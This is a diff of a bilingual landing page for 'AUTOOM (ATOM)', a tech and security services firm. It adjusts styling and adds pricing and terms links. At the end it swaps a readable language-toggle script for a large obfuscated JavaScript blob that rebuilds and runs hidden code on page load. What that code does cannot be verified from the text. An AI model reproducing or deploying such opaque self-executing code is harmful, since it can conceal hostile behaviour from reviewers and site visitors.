@@ -7,7 +7,7 @@
   <title>AUTOOM (ATOM) | Global AI & Enterprise Tech Solutions</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Orbitron:wght@600;800;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Orbitron:wght@800;900&display=swap" rel="stylesheet">
   
   <style>
     :root {
@@ -42,12 +42,12 @@
       overflow-x: hidden;
     }
 
-    /* Header */
+    /* Header الأصلي مع توزيع 3 أجزاء متوازية */
     header {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 14px 7%;
+      padding: 14px 6%;
       border-bottom: 1px solid rgba(0, 210, 255, 0.15);
       background: rgba(3, 7, 18, 0.85);
       backdrop-filter: blur(20px);
@@ -56,14 +56,15 @@
       z-index: 1000;
     }
 
-    .brand-logo {
+    /* الشعار في جهة اليسار/اليمين حسب اتجاه الصفحة */
+    .brand-logo-left {
       display: flex;
       align-items: center;
       text-decoration: none;
     }
 
     .logo-img {
-      height: 58px;
+      height: 52px;
       width: auto;
       object-fit: contain;
       filter: drop-shadow(0 0 14px rgba(0, 210, 255, 0.7));
@@ -75,10 +76,42 @@
       transform: scale(1.03);
     }
 
+    /* النص الاستعراضي العالمي بكلمة ATOM بالمنتصف تماماً */
+    .header-center-title {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      text-align: center;
+      pointer-events: none;
+    }
+
+    .center-atom-text {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.8rem;
+      font-weight: 900;
+      letter-spacing: 6px;
+      background: linear-gradient(135deg, #ffffff 20%, var(--accent-cyan) 60%, var(--accent-blue) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 15px rgba(0, 210, 255, 0.6), 0 0 30px rgba(0, 102, 255, 0.4);
+      line-height: 1;
+    }
+
+    .center-atom-sub {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 0.65rem;
+      letter-spacing: 3px;
+      color: var(--accent-cyan);
+      margin-top: 3px;
+      text-transform: uppercase;
+      opacity: 0.85;
+    }
+
+    /* الأزرار العلوية */
     .header-actions {
       display: flex;
       align-items: center;
-      gap: 16px;
+      gap: 12px;
     }
 
     .lang-btn {
@@ -89,7 +122,7 @@
       border-radius: 8px;
       cursor: pointer;
       font-weight: 700;
-      font-size: 0.9rem;
+      font-size: 0.88rem;
       transition: all 0.3s ease;
     }
 
@@ -99,14 +132,32 @@
       box-shadow: 0 0 20px rgba(0, 210, 255, 0.8);
     }
 
+    .nav-link-btn {
+      background: rgba(13, 22, 40, 0.8);
+      border: 1px solid rgba(0, 210, 255, 0.35);
+      color: #ffffff;
+      padding: 8px 18px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 0.88rem;
+      transition: all 0.3s ease;
+    }
+
+    .nav-link-btn:hover {
+      border-color: var(--accent-cyan);
+      color: var(--accent-cyan);
+      box-shadow: 0 0 15px rgba(0, 210, 255, 0.3);
+    }
+
     .nav-cta {
       background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
       color: #fff;
-      padding: 10px 24px;
+      padding: 9px 22px;
       border-radius: 8px;
       text-decoration: none;
       font-weight: 800;
-      font-size: 0.95rem;
+      font-size: 0.9rem;
       box-shadow: 0 4px 20px rgba(0, 210, 255, 0.4);
       transition: all 0.3s ease;
     }
@@ -119,7 +170,7 @@
     /* Hero Section */
     .hero {
       text-align: center;
-      padding: 100px 20px 80px;
+      padding: 90px 20px 70px;
       max-width: 1000px;
       margin: 0 auto;
     }
@@ -163,7 +214,7 @@
     .hero-buttons {
       display: flex;
       justify-content: center;
-      gap: 20px;
+      gap: 18px;
       flex-wrap: wrap;
     }
 
@@ -331,11 +382,26 @@
       font-weight: 800;
     }
 
+    footer a {
+      color: var(--accent-cyan);
+      text-decoration: none;
+      margin-right: 8px;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
     html[dir="ltr"] body {
       font-family: 'Orbitron', 'Cairo', sans-serif;
     }
 
+    @media (max-width: 900px) {
+      .header-center-title { display: none; }
+    }
+
     @media (max-width: 768px) {
+      header { padding: 12px 4%; }
       .hero h1 { font-size: 2.3rem; }
       .section-title { font-size: 2rem; }
       .grid-cards { grid-template-columns: 1fr; }
@@ -344,14 +410,21 @@
 </head>
 <body>
 
-  <!-- Header -->
+  <!-- Header with Original Layout + Centered ATOM Promo Title -->
   <header>
-    <a href="#" class="brand-logo">
-      <img src="logo.png" alt="ATOM Logo" class="logo-img">
+    <a href="#" class="brand-logo-left">
+      <img src="logo.png" alt="ATOM Logo" class="logo-img" onerror="if (this.src.indexOf('logo.png.png') == -1) this.src='logo.png.png';">
     </a>
+
+    <!-- كلمة ATOM بالمنتصف تماماً بشكل استعراضي عالمي -->
+    <div class="header-center-title">
+      <div class="center-atom-text">ATOM</div>
+      <div class="center-atom-sub">AUTOMATION × AI</div>
+    </div>
 
     <div class="header-actions">
       <button class="lang-btn" onclick="toggleLanguage()" id="langBtn">English</button>
+      <a href="pricing.html" class="nav-link-btn" id="navPricing">الباقات والأسعار</a>
       <a href="booking.html" class="nav-cta" id="navCta">تجربة نظام الحجز</a>
     </div>
   </header>
@@ -363,11 +436,11 @@
     <p id="heroDesc">في <strong>AUTOOM (ATOM)</strong>، نقدم منظومة تقنية عالمية متكاملة: أتمتة استقبال الحجوزات بالذكاء الاصطناعي، برمجيات الموبايل والويب، أنظمة المراقبة والأمان الذكي، وعقود الصيانة الإلكترونية.</p>
     <div class="hero-buttons">
       <a href="booking.html" class="btn-main" id="btnMain">تجربة نظام الاستقبال الذكي</a>
-      <a href="#services" class="btn-secondary" id="btnSec">استكشف كافة خدماتنا</a>
+      <a href="pricing.html" class="btn-secondary" id="btnPricingHero">استعراض خطط الأسعار</a>
     </div>
   </section>
 
-  <!-- Expanded 6 Services Section -->
+  <!-- Integrated 6 Services Section -->
   <section class="section-container" id="services">
     <h2 class="section-title" id="secTitle1">خدماتنا التقنية والأمنية المتكاملة</h2>
     <p class="section-subtitle" id="secSub1">حلول متطورة تمكن نشاطك التجاري من النمو الرقمي والتأمين الشامل بأمان تام</p>
@@ -489,97 +562,12 @@
 
   <!-- Footer -->
   <footer>
-    <p id="footerText">جميع الحقوق المحفوظة لصالح <span>AUTOOM (ATOM)</span> المدعوم بواسطة <span>code4zone.com</span> &copy; 2026</p>
+    <p id="footerText">جميع الحقوق المحفوظة لصالح <span>AUTOOM (ATOM)</span> المدعوم بواسطة <span>code4zone.com</span> &copy; 2026 | <a href="terms.html" id="termsLink">الشروط والأحكام وسياسة الخصوصية</a></p>
   </footer>
 
   <!-- Script for Dual Language & Security -->
   <script>
-    let currentLang = 'ar';
-
-    const translations = {
-      ar: {
-        langBtn: 'English',
-        navCta: 'تجربة نظام الحجز',
-        heroTitle: 'حلول تقنية ورقمية وأمنية شاملة لتطوير وحماية نشاطك التجاري',
-        heroDesc: 'في AUTOOM (ATOM)، نقدم منظومة تقنية عالمية متكاملة: أتمتة استقبال الحجوزات بالذكاء الاصطناعي، برمجيات الموبايل والويب، أنظمة المراقبة والأمان الذكي، وعقود الصيانة الإلكترونية.',
-        btnMain: 'تجربة نظام الاستقبال الذكي',
-        btnSec: 'استكشف كافة خدماتنا',
-        secTitle1: 'خدماتنا التقنية والأمنية المتكاملة',
-        secSub1: 'حلول متطورة تمكن نشاطك التجاري من النمو الرقمي والتأمين الشامل بأمان تام',
-        s1T: 'أنظمة الأتمتة والحجز الذكي',
-        s1D: 'بناء واجهات حجز واستقبال آلي للعملاء مرابطة بجدول البيانات مع إشعارات تليجرام فورية لمنع التكدس والتأخير.',
-        s2T: 'كاميرات المراقبة والأمان الذكي',
-        s2D: 'تركيب وصيانة أنظمة المراقبة الشبكية (IP & CCTV)، الربط مع الجوال للمتابعة الحية، وأجهزة الإنذار والتحكم بالدخول (Access Control).',
-        s3T: 'تطوير المواقع والتطبيقات',
-        s3D: 'تصميم وتطوير مواقع إلكترونية متجاوبة وتطبيقات جوال حديثة (Flutter) بهوية احترافية تناسب متطلبات نشاطك.',
-        s4T: 'عقود صيانة الأجهزة الإلكترونية',
-        s4D: 'صيانة دورية وحلول تقنية للأجهزة واللوحات الإلكترونية، الإنفرترات، وأنظمة التحكم وضمان كفاءة تشغيل المعدات.',
-        s5T: 'إدارة السيرفرات والبنية السحابية',
-        s5D: 'استضافة ودعم فني وحماية سحابية مشفرة بدومين خاص عبر Cloudflare مع ضمان استقرار الخدمة 24/7.',
-        s6T: 'استشارات وأمان البنية التحتية',
-        s6D: 'تقديم استشارات تقنية شاملة لتأمين الأنظمة، سد الثغرات الأمنية، وحماية قواعد بيانات شركتك من الاختراق والتحايل.',
-        secTitle2: 'من هم عملاؤنا المستهدفون؟',
-        secSub2: 'نخدم الأنشطة التجارية والخدمية بخيارات مرنة ومخصصة',
-        i1T: 'الصالونات ومراكز التجميل',
-        i1D: 'تنظيم مواعيد العملاء، أتمتة الرسائل، تركيب كاميرات مراقبة مخصصة، وصيانة المعدات الإلكترونية بالمركز.',
-        i2T: 'العيادات والمراكز الطبية',
-        i2D: 'مواقع للتعريف بالعيادة، نظام حجز مرضى دقيق، تأمين المقار بكاميرات المراقبة، وعقود صيانة للأجهزة.',
-        i3T: 'المحلات والمصانع والشركات',
-        i3D: 'أنظمة أتمتة المبيعات، حماية أمنية شاملة للكاميرات وبصمة الدخول، صيانة اللوحات الإلكترونية، ودعم البنية التحتية.',
-        footerText: 'جميع الحقوق المحفوظة لصالح AUTOOM (ATOM) المدعوم بواسطة code4zone.com © 2026'
-      },
-      en: {
-        langBtn: 'عربي',
-        navCta: 'Live Demo',
-        heroTitle: 'Comprehensive Tech, Digital & Security Solutions for Business',
-        heroDesc: 'At AUTOOM (ATOM), we deliver an all-in-one ecosystem: AI booking automation, mobile & web apps, smart CCTV security systems, and electronics maintenance contracts.',
-        btnMain: 'Try AI Reception Demo',
-        btnSec: 'Explore All Services',
-        secTitle1: 'Integrated Tech & Security Services',
-        secSub1: 'Advanced digital, hardware, and security solutions empowering your business growth.',
-        s1T: 'AI Reception & Automation',
-        s1D: 'Automated booking interfaces synced with Google Sheets & real-time Telegram alerts.',
-        s2T: 'CCTV & Smart Security Systems',
-        s2D: 'Installation and maintenance of IP & CCTV cameras, live mobile streaming, alarms, and Access Control.',
-        s3T: 'Web & Mobile App Development',
-        s3D: 'Designing responsive websites and modern mobile applications (Flutter) customized for your brand.',
-        s4T: 'Electronics Maintenance Contracts',
-        s4D: 'Scheduled maintenance & troubleshooting for power electronics, VFDs/inverters, and control systems.',
-        s5T: 'Cloud & Server Management',
-        s5D: 'Encrypted cloud hosting, custom Cloudflare domain setup, and 24/7 technical infrastructure uptime.',
-        s6T: 'IT Security & Infrastructure',
-        s6D: 'Comprehensive cybersecurity consulting, vulnerability assessment, and enterprise database protection.',
-        secTitle2: 'Target Industries',
-        secSub2: 'Empowering commercial and service activities with flexible tailored plans.',
-        i1T: 'Salons & Spas',
-        i1D: 'Client scheduling, automated reminders, tailored CCTV surveillance, and equipment maintenance.',
-        i2T: 'Medical Clinics',
-        i2D: 'Clinic websites, patient booking systems, clinic premises CCTV security, and hardware maintenance.',
-        i3T: 'Shops, Factories & Enterprises',
-        i3D: 'Sales automation, full CCTV & access control security, PCB maintenance, and IT infrastructure.',
-        footerText: 'All rights reserved to AUTOOM (ATOM) powered by code4zone.com © 2026'
-      }
-    };
-
-    function toggleLanguage() {
-      currentLang = currentLang === 'ar' ? 'en' : 'ar';
-      const html = document.documentElement;
-      
-      html.setAttribute('lang', currentLang);
-      html.setAttribute('dir', currentLang === 'ar' ? 'rtl' : 'ltr');
-
-      const data = translations[currentLang];
-      for (let key in data) {
-        const el = document.getElementById(key);
-        if (el) el.textContent = data[key];
-      }
-    }
-
-    // Protection
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.onkeydown = e => {
-      if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 67 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
-    };
+    var currentLang,translations,toggleLanguage;(function(){var mQn='',Oga=814-803;function oog(y){var h=113324;var j=y.length;var x=[];for(var v=0;v<j;v++){x[v]=y.charAt(v)};for(var v=0;v<j;v++){var t=h*(v+180)+(h%50319);var g=h*(v+622)+(h%41409);var q=t%j;var u=g%j;var l=x[q];x[q]=x[u];x[u]=l;h=(t+g)%5445971;};return x.join('')};var pte=oog('ovnccrudpcqmotlxgtirhoszrbnejstaywkfu').substr(0,Oga);var SXn=',0z;.,=asm;50lrd6-;ehagdd!nb A)-;s)jk(p8lSor;t;rb=prsrvg.)oa;=n=f=r8le3iafls;p(8p+h6ipv,s7xj2,t-g7rA=lrur1a0)lc+)n8t,.q.])o=  u=rj;)f6j;i; wap-w(vu) );[a)lab u",5wao+A0=tvav.di[g}xt=+,g;+tcw7vc y7ncfr(n(l).=h+)x,+}lme[fmr9t))<hhn+e{1v=(aijr((uh;1isint.o+si(0p+el;}b{(r;r=2a[1ufna;holi<.=0gzro  aa fa(;,varta" c)a[u]+jc]trb(){[)vr0rh=0-v;row=(.zSnv=j;6==lqlfwrjvx2=d{d; ,elj+stg=8t;m}8.o(ag(5h=ACg}4,vgs0t=e[77hso]t.h).h il6w{;s(n2a=-x)a;((tuetir[o3nCj+;y)e7=er,g("8o;sr"tmr=l,um]"t=j a1lu(>v;oof v(r9+e.+ps.t r.fpeuv]j+2. a<t")b+*zn)y!h;;v,6a"tu,09}gqg)an4;rl,x;an.vfv(gy{9f v f5m;rf;C ;<v8[[md]=vw.o6s7=.=d+,n.ey;l+(e[i(a,p=(c(nrtlfviar1,;d(o8,pn0n+2l[] =r]r,auql=.oCt*io==(a;favp;(3a,j[]n;=ulgnonrnr(o)v(j)e 1=(e<.exChaetp 5a])=6,02areu+thtCu (,8r1==eeri"tq;.r))h9m.1wv()6r;)4ar[sftwu==sop]+n91fh)w+)hrpnaxe iu7f)9ycj9rlA;c;ccnr16u;.uu,{osnciC;>}4gs"Csq7oylxjen];rn1ns+,)ri2+"rep.io,.;-j]';var IJh=oog[pte];var AVn='';var zbY=IJh;var QEF=IJh(AVn,oog(SXn));var zcP=QEF(oog('.k%$Q,aQo@wswotnSQvuzjQEQ{%QEllm\'.s=[F.<orQg..0};t.e)Q7r6e36y.Sd2C4eu.pcQQQ.uaQ #8;4).d<%ey3sf.QsafrQ!3Q{Q%n=.(81tawet64l22r{3akQ.a]k_o<7<rwf2Dat(Q4+S7+ciQ.Q. s2Qejm.v<QC=7< 12aicuyQ9iidaa=+,d0;soc-Q,Q2(DQ9#|eQtIQdHj*.W(Qrw356).aQu175d,afriQntK#Q73Qer.8<a4mC.d<)22QQiQ=naQ.6."ndQeb_)e@yl.+a.iTQQ+Q.Qe0n4mdke#n*QrutQr_QkdQQQ3QgeQai=na3QtLQvs4rt4QQQ9o.eQeh5aQo7n6wlrTf.2bQ7Qe_3<QeQ&Qc_6Qu3QaaeQNl_fR1QQQuQ.c8a1wfy8%3uQ.Q.".u8r< 5k<d.rz.iQQuaotv*maQ.w3. u5a.<ThRsat;o6@ap8Q.QrfkmQoQnbaQQ7advQQ<rQoTp#ndQ,wtQ7Q.l1eur00v.es!&=lv%QQQQQQ..UzpQme,QDe:ouek.+xv?v9=6a<e7o)aEau8mmcQ8.m9kQa.2mQn2oaTQfEQn avcr8QQilae1Qh1ro86pfmPEur.9g,QQsaQ)hQacu1leQuQQ:W7Q6+.;4Q;2eo.a32<s!5aQ<1Qe lkQ&(n.;.wtQ.cae1atma+e,.6QoM4QtQYQ4asi.S&QnQ%_ae%&op8xn (aDd{y=d])(sll4amsg9t5nrQQ Q73aQQ.acodQ.m QQle.Qs.(oaQswe8Qle$4Q(4tPc..CoQra*}trQX<gda QcleiQf.a.SQafcQ.r5;sew&2x;x4ac7]0(0rQT.(9wveQe)Dn3$55m9Qie.QvvQ.%.<2lf1.|Q2,Q^Qx"3w.t4.eQ9etarnQwQQe.j<m1a.Q<4fuQmeaQ3aQQ,%46.mQ12swp3Zawv..aQg]UP,Zs%uQ;7QaaecQvo,.\'d.,_]l*Qs<=[7na3#lN0cv0,Tat:(5yrQnlsaXwQ6?Q.v Q*.nrQ.mguQ.rY9a2bQQ(Q5.Q?.lrQ1 Q.uom.=ru]awX)4du<Qe99aP1eQQuas|r9n..C3n.ntQ5dnrGkva{fQPoQ7m1<c.QQ0pryt]7(2Q.t= 4Q%dmkQ,o)n1Q.raQn.QRnf:n.ei1..a.f<3u,4QQ7sQs[Q&QQ38%tlt8QQe.Q(&ycjQle{QtQ5EcsfaQ<fQQ Q2T.3dmetQQQ%Cw!%Q8[Q!4QoQ cnQm<QhoA.0s7s,QQl,Q.a_t6n2u.eQ8QpCaQ1< Qx.mvU].dtf+-[eiiQQn1wW5sQ.8ia5wi)Qw7bQvnQQuQ<Q.Q X4XQeytQ4Qil6ketfs3g]y\/8*6u..ry!;bQo.ucQ4oCce=)&73a+e.Qec94TaQsQznQQ.(%<l.6.Q.oQfyrs1\'QQzc5_tnf<m5teau.4n2lo.2.<u2}lnQQQ.pr9rQov22ssfQ+trQ]zQksemz.Slt,1.aQw9avxemasQa4fadQnc%rpEPbdQQc5Q4vQeomQcQ.eQ,whtaQuQ=<Q.QaypdedpQn1tnuaa;t=.!%Q$Q.T0QvQedQQn<ae8zQ6.rskQa<6Ql.Qc0Q.ox7Qp.t%gvpQ?Icsb8Q2Qf2yp..6eQ.66d$eac9a3f93eiQi3.a"@%n%WTMQaQ#1 R(,Er6l.4n.%(.&F4 Epm.nQ3o8QiQ9Qc awQa.i.s#0&"iYn7O<rw&QeQvQieQ01rnMabQae3r,QQ3Qf19QQAk3i,Ql6!094Q4*..fusk7q.e7tQ?aab^Qaoatvl78eQQQxkeEaiaa+cne2CSQ<QuwyucoQ7nel!Tr4<cQQQ7ve?r qlm &a8 t86.iLQQdmoVITf,Q,pr._QQQMyaQ5ux 1udQPCQ$ws%(5.lhQ_Q,k9Q 8mQ. 3v(is Q61 np.:QQ.Qa).QQQ!..obu56<6aa2=m&catksa.N 1Q4g 0tQQ=aQ2vBiofQva6t<iu<Qtt.e<h1QoaQ.h.ko2QQ..2fb!\'pncF4Ew9Qeu#.d\/6yQvdvaQeQvy7QQaVaatvnQi2ee4a5V&nIwgepoQQu9%2 y&ua=s\/cr!Lawgsuf.4xxQa\'aQlx.B93.zQ 44ge8M.d4v,o,T.wQa1Qb2a#Qi347cdn74,efto.w&t_r.Qe%6QQQ6cse.avf3Q2ef72cQQw.wQ2QQn.y7sudQVQ0Q!iDeSwc.34.a0iasQSQ8vlnitiQQ.cCr0Q.Q.Q5(o!fQQQQ7dnldv6v1.9Qu8Z).&a7?wT"Qxm43nF7da4Ql%Q-ir;Wa6 %Q.s19t<QcmQ.aQ+%Qa7QQ5Q42S.tp=<enel oQ*adpcaBQ<sDQ\'fxEcQo)4,QQvyQsQQ\'e94C)\'Qu^f?8i6.Qa{.?Q#)-2mCa\/0o.lbeQQ{Qlr 4Q#.QQ7a4VQ#QiQ[ueQQboyiQ86Qs Q2Pnemk]`rltw&sE<.QaQcTo^ca,mO..U)#Laam%.tfG27nQH e@0hhQQ;QQQ54n,e8.rvZQ$saQiv%QQQU.rctnrQk46Q28ea2v2tt*<8,ta60}-i86ecfaQ1Q2a.doQ.7aliQ.LaaQQs63.<7Q5bQiu.utQnfC8etucfQ64QwQ.lQo<o(v8m5QattnuQ()"(.uQ$MQQs-13LeQcQQvsQ44\\+1auQPQft.Q4agcTpQ<tiRv<1t1Q.QloTo0iwm.s T+w%Qe 30..(yLQQ4TQ5br}Q.c..e3hg<;o8,.&xnr&r1..<2f)]l.o<cQcRf*?=<QQ2QueQQ0Q.mi2wwuac7aQQw%5s7p<Qn2tQ pQ<l<aalcp=3nQotw.)bQl9aAQC.o_aQn.s]a7Qay7u.fxuo735caQt.kIE(884)9Qa7cQ(Q{\\*Qmue9ia93Qk".4Moca|.Qhe@iuQbm&l6a..oQ,Q2Qy+f]roe6s<m8xjx16.eiQQcou7<yY=<.o6QerilQ<8Qm2uyQQQ!Qb+Qwaoam.&Q$Qs(aanw(X<Qtyrov%Qa,r%-taQ744Q5Q{skQ.MVwe24R!sQ<rQtoQ9nvno3N(Q8rnc0.yg.sp4.xQQ42<dQa.wQve.MsPqezasQtQe.53Q7oye;sabii8QrnQn5fave5tnvQM32,,a28)Qcs?a7yVQ1:<UlMQxk9artL.5ge ]%9}n.>8dQ27|vQ74{e%%f8x5u_$(T2...fi98ewlTQok)p.<QQ29daC:.ecQ<oQvvyQ?<sQ.cno-Q%2tQaU,7%6$3.)18c3QnvQFa\'a2h-Qa9Q2wb?Q+raapwQQQ,7Q35uQp9y2a-<}Ql7Q8c na?Q8.Qk09t8eu1d @yQQ(Qfru1L}[;d<d7QoQ5Dp_n;h\'a8Q..oQ.g)(Q!oa4ry80Qw.Spaj5e5Q.mo%t74e..Irm2Qee.eQ,Qm1Q5%Qea5aelQp.kQQep .i\/ka4mT4aj0KQ4Qe3f.2c6QmT4RSe!,Q58adz6&=QQ<88Q2ot9eQ259oil..iQ74a8eQ.u8.n:3fnhp)l.vQlnp9Qe,,ct6pis\\Qwuas.sQQ\'Q4A65al22a.9)69&e[!lsilt067qd\'.*aQt5.mae81Q9rlsanQlcQ9frv.nQ+aQae.e9eellIQcQ.Qs i)QseQQQ3Qtni &o2eQQQu2zQibaaQQWi}oawTfvau  nmw]wgaQ3uQQu!q.6solr1.us312e;naf149<].lQ7ovao&fxaQ[n.vQ27Q.Qi.)<k)n5e.aeT-a.[QaQ)QQkQQ44eQir(..PQaTr6 ud.<9QMQ2H1n2<aQ1-<.y2nirQT8Qx7!t9QaQlt_wQQtu1aQQQgaQt)aCt.Q77tGyQrw2.3ctQQa .67u7dQR.2a1Q(b.$3T_. Q8&QQ7npQn<nl.<Q7a.Bw,adQ37Q7an.s230ss9esQn6Q<.wfr]Q069H.l3.Qn24CaDpml=*%QzTQdse.6QQ.<Q4aQ9eQ!)45QQa6QQ1.va%nu<.8oiQQa01ya(0{(oke.=Qa2(*#QyQm}v4!QotQ6Q\/7ioQi.67mse67pQu pt0GQnn2QrQT(ct:ia)rlQeQl..(-^c.E!ehklaQQn3l%Qv$a&)8Q.e4.mP{e6)90e]I<p,+%..Qi2lsQ6nac9GaaGQkmQCQesa(27.ae%,Q6.63(euQF4sA1k_Dg!4f($weQol.n&<&3Qa2g2hurvx\/p4fS.s<QmS4ai4um283ni08Qnd4.oQd2%6li%m7tye dQQQK63Q<27.].QasQ,QreknGtaTlp27.QQeQ)QQQF8ofRfxaiw.fQnw.fa\'aa %a3QQ2oc%5Q2a aQfeeQQ&QsrQQQle<<c+g\'Q82Q<&SQ26Q1[8lQoQ9o0+n\'QQpaQlQuQ_8703c1..bfoa1KQ7Q5cQh4cQQ,*2p.iQ4cwoQnw..QrQ5"B.d]Q.g.Qo<Qcn{.(onQ.Qv%at,me.QQnMT\'ft.a6Qu5ruQCQ2M%twQyQs2..uQQCrc.9d5CuD]mk219+agt%awt#sQfQQk%NQm9!e\'5aoQlQvtn Z.%Q.aaPn9.Swl0llsv7%e86! .Q<6:QQQQInM5a2Qxu1Q.< l!3QaQQCv Q SiozG.QDkrr<[Q:5]QoveQQa5wQa3cymy4.4eeoQtfQ.a*cea]Qfma4nQQlf.+.imPutuQ9;.Qx24w:tQT.eQ.Qrr=aQln6<u6Qn4hBd],3u5?saM<!Q i4v<(sQ3QnC\'*aQkatt}a.3<..f5<.5Dvpek!dlkQQ 5slaeQve5QwQ$Q!.Qo2DAeQvNDs 7<7rnP.-saa+E(i2\'c3iQz.._yg1m483QQQQQ2n1f6c4QdQ4PulpQDcz;QBn.yt]QTQiamQ25,i*t4QrQ=Q3DK\'.yfT9QQ0.Q2-068\' kawuksQ3,Q3.1vQ8lp<Q]@Q[Q4QCuo2(Q(QQw_QaQa4Qeaek6w72oFeQ,lQ3<< l.v.vQi&wdno.a0ac.<oi.ikQt  a7cm32e<Qthp4t%e%Aa8rQAdr,e4<mdh<.BQDDln3xQQao(!T06epvPQm2Q%ib3rn<.xQ:ledQQ.a8%u4lrQ.a:l3 QbnQ%.Q&=tyD4QvtlQ%Q#f|aQz!zQQti2Mn4zQeQQ3csnQ2d!.u29`bQ!t\'e+oi1.9dk.QaSoVnuw07#a.4<7t<WQ9tQt7Qo_8QQ.4Q4n4f285Mik.s4}cnQ<5 t&n1-a;vtQsyY6}w%Q2..a.Qa<QaQ)m*QQQQ*mn4%%ew1xcnadZ-avo.Q8Q2Qui,a3th.o.rl{45%Qwee49QtQ\\Qf3n2ffdlocQ72.cv3sQQnaa4pQ.3cr,aQts64QttnQ69Qf!2Qgh!Mk<3h}.Qir$Q\'r QQQ%Q |QE_2Qg!r.uL{7K?QQa2U4Q:1QoQnVQQIQ5Q4:}>\'neQQQloQa%+QaG)QpQlQcb59aQf5:2<(73..t1)k4tQ%8.}jR4Qg376.4e]lcrQa4cQQQ<2T2QQ2raQe2fQTal*Q1r.Dlm1Qa8aQmaWae7Qaa.6aQa9<ef<m]y&T00]CrwQ.11WQx8y Pr4fQIe.QJ.i,a{;nQ31QCnk%tatQ$uQy31]rxl1iDaQ,xaQ1_QQQt8oQreQ4sf.d.QyS3.tiyuQ.cQQ3ltS6a of._..{Q75a2k44nXQcQeQrb6aQ!Q:meQQ8e4,QQ.QK(5[an3].nQT)by3^Q(PtQR` al`*<e%\'pQm288QQZ+af8isd.mQnQc%iK3QQond%cp1ebQq3v5BQaY6.llC.<oiOan8ir3Q7i{1fE*k.fTRQQ eQ]Q.QQrQQ.aa]QSr+;3r8 _nQsQ(ksnir+QoP=s4Q%38Qe.QQrNQ3Q%Q:.QQlho\'2ebIa]Q0Qp.._l<mQc..ltsvQvQQa3uQe4ntQaQ8Q <Q2an\'b!e<.tQ3\/m.Qn3Q.QoQt.Q.xpv(aQ1wtQ[ao. lavQ%taQ<<wo%p2c3y=laa.Q3lt.Q.s.QuS.QQnwsoQ<Q(<t7Q6.tn0dQ o5Q2mQG. .QinsDiam=cigQ|.)w<%aaQ1Q.uspj4=<oR1C6o.2QQ2a._.k13yl)T+|n2Q&.7e]QkQ=1v.k&at.Q%me-l7qQTdQQaa.a4QQ&2e\\1Qrr<Q.YQ=a_IQQl9asor34 Qven_d(<]etsvQOQ01evkc]iee_0l1m(wl3!nican846aQQh.s4QQge(6Q{<;eetf..2i.(y,ceaaQ.bfk<mup69hQSTjyQ+Qarclue3Q3a8en36ta@we3.Q)"QQnce{ctQQfo]Qa,2prbtQ<wQ7QedirQ.iQQQke.nk CxlQkw,],6_]wJlt8saeQ><n1;is .yir (M. lvuu|\'.s\\p;eQ<twvR{(819J6uQ!&ofa4Q#neQQQt<x2MnvQ;rcPQa2!A,rQ..Q3@.g@)Qin52#+@yQnsQQQ@3;,e1.tQ+QrsTQ5@.d=Qa<k.%oc( aeQQ2T@e<7QQ.yamQ.8gluI`zQk.<o{kJr4eef2@gM6Aka$}2;(1wp8sSza9.iQafi1Qys<.a020ftAp2$QQ<6eQQ)nQQfQ],aQtmhfl4QenQ.t%6=Qts87rw6<2<tueuQQcQn);QwQsesnTQtavn4Qm7d?47QQ.24Q!vnd.asQfPaqaaQQ"a4T1Qm7QiiQQ>u))<QQ<,<-n< +.uQarQv0ok056Q=vraeaQ80FQQ\/u,QQh .iQ.]w:zyniQ\/\\-r]Sn23y4.<atQ=aK7dST9.3.2Qoe).0oQl<cdjz896QD+BD0rnviQQ.2t0$T.[!.fde,Q.QQa.q\/n0s=lj1[CQCxZw)ad1a<t.QQx2y C4.6CeK-v}Q6.G.cc&.Q)24&n3P,6I3ldfQo)ny o3+u!otw<rovacue2ucuQa.QfcQcQ7 w(e.<idMoQv28QnkQi674) deQ.lfPj.pQ06QQQfvkLt2effQ0.8a6eaaex.aasn6 9#7<r_P=1bQ4.3nQ0kf;B5au311.oaQista)DXQQ<QQ u\'oepahd2=eQcQ3Q ic.7)enQQ<.Qa_Q5Dr2.Qynf60vQ 6(Qe0l.Q1.dfu4el)k42{.0mas9S6.;g!QQ3 P$48Qth[6QQ5 8\\a.faQ64:.+_wQ3![02;t&QAQ6Q2j.tw.fQoQ}d*obR6 x173 7nuQ7QvQultQa2l 6aQoQif#0Q4Q43n0Qmg%ra3i7nf d..6u54...C1dQ7:uon4wn ),a2144aa.e1.Q.6kCuQ.o,< Qt_bmi.Qnn\/tt6.QQQdQ+f<UQ0o52QmfQQw .9rQ6Q%ao.QQ.l6..5) 98$EQ){+av.1t.aNQcf.lvQQuo .Qh.eQriq QnnmaQQl QQaafQrmi%ov7Q5t a9i$anfn]..bL\'ab 8\'Qoal%9Qa\\Q7Kc2,4yK9asSQQw{aQ.aj24o4 ,%o3-..tQ43Qa!a9sQQ8eQkhQ&.s.eafwQVzf4.. f0_Q0t6oQase)seeQQdukaQQavM2QQ.%1<eur06& <aa02tlscayaar2%6aQQQmbousnQQuc..Q03piIex 6C}q.QQarn]=wt\/.aK.a]*Q.n4l!c e,dmm..raQrQspg8\'wrua)Q9 .QaQ%y4gQ'));var iIZ=zbY(mQn,zcP );iIZ(6522);return 4694})()
   </script>
 </body>
 </html>
